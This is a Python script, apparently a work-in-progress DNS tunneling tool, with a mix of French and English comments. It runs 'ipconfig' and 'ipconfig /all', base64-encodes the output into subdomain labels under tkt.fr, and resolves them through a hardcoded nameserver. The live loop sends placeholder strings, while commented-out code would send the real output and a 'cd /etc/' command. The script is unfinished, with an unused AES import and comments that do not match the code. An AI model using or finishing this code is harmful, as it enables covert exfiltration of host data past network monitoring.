from dns import resolver
import subprocess
import base64
from Crypto.Cipher import AES

def divide_chunks(data, chunk_size):
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

def domain_size(domain):
    domain_array = []
    partial_domain = domain

    while len(partial_domain) > 255:
        # Split the partial_domain into a chunk of size 255
        chunk = partial_domain[:255]

        # Add the chunk to the domain_array
        domain_array.append(chunk)

        # Remove the processed chunk from the partial_domain
        partial_domain = partial_domain[255:]

    # Add the remaining partial_domain to the domain_array
    domain_array.append(partial_domain)

    return domain_array



# Example usage with subprocess
command = "ipconfig /all"
process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
output_binary = process.communicate()[0]

# Convert the output to string
output_string = output_binary.decode()

# Divide the output into chunks of size 55
chunks = divide_chunks(output_string, 63)

# Encode each chunk
encoded_chunks = [base64.b64encode(chunk.encode()).decode() for chunk in chunks]

# Construct the domain name
domain = ".".join(encoded_chunks) + ".tkt.fr"

#print(domain)

HOST = '192.168.1.6'
PORT = 53
CHUNK_LIMIT = 63

"""
def send(data):
    encoded = base64.encode(data).decode()
    domain = f"www.{data}.tkt.fr"
    answer = res.resolve(domain, 'A')
"""

# Créer une instance de resolver
res = resolver.Resolver()

# Spécifier le serveur DNS
res.nameservers = [HOST]
res.port = PORT

command = subprocess.Popen(["ipconfig"], shell=True,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)
out, err = command.communicate()

#print(len(out))
    
cmd = b"ipconfig /all14494984988888888888888"
cmd2 = b"77777777777777777777777777777777777"
cmd3 = b"8888888888888888888888888888888888"
cmd4 = b"EgZGlzY29ubmVjdGVkD"
encoded_cmd = base64.b64encode(cmd).decode()
encoded_cmd2 = base64.b64encode(cmd2).decode()
encoded_cmd3 = base64.b64encode(cmd3).decode()
encoded_cmd4 = base64.b64encode(cmd4).decode()
out = base64.b64encode(out).decode()
domain = []
domain.append(f"{encoded_cmd4}.{encoded_cmd3}.{encoded_cmd2}.{encoded_cmd}.tkt.fr")
domain.append(f"{encoded_cmd4}.{encoded_cmd3}.{encoded_cmd2}.{encoded_cmd}.tkt.fr")
domain.append(f"{encoded_cmd4}.{encoded_cmd3}.{encoded_cmd2}.{encoded_cmd}.tkt.fr")
domain.append(f"{encoded_cmd4}.{encoded_cmd3}.{encoded_cmd2}.{encoded_cmd}.tkt.fr")
domain.append(f"{encoded_cmd4}.{encoded_cmd3}.{encoded_cmd2}.{encoded_cmd}.tkt.fr")


for i in range(0, 5):
    answer = res.resolve(domain[i], 'A')
    for ipval in answer:
        print('IP', ipval.to_text())
"""
domain2 = f"{out}.tkt.fr"
domain2 = domain_size(domain2)
print(domain2)
"""


#domain2 = res.resolve(tmp, 'A')
#domain2 = f"www..tkt.fr"
#domain3 = f"www.{out}.tkt.fr"
# Faire une requête DNS
#answer = res.resolve(domain, 'A')
#answer2 = res.resolve(domain2, 'A')
#anwser3 = res.resolve(domain3, 'A')
#send(b'cd /etc/')

# Afficher la réponse
#for ipval in answer:
#    print('IP', ipval.to_text())